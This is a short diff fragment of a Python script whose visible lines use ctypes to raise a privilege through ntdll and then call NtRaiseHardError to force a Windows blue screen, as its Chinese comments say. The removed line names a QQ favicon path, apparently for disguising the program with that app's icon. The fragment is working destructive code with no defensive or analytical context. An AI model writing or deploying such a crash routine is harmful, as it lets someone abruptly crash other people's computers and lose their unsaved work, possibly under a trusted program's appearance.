@@ -11,4 +11,3 @@ ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref (ctypes.c_bool(0)))  # 提升权
 ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong(0))) # 触发蓝屏
 # 怎么让蓝屏改为用户手动重启呢？以后思考
 pass
-# A:\QQ\versions\9.9.20-37051\resources\app\resource\favicon.ico
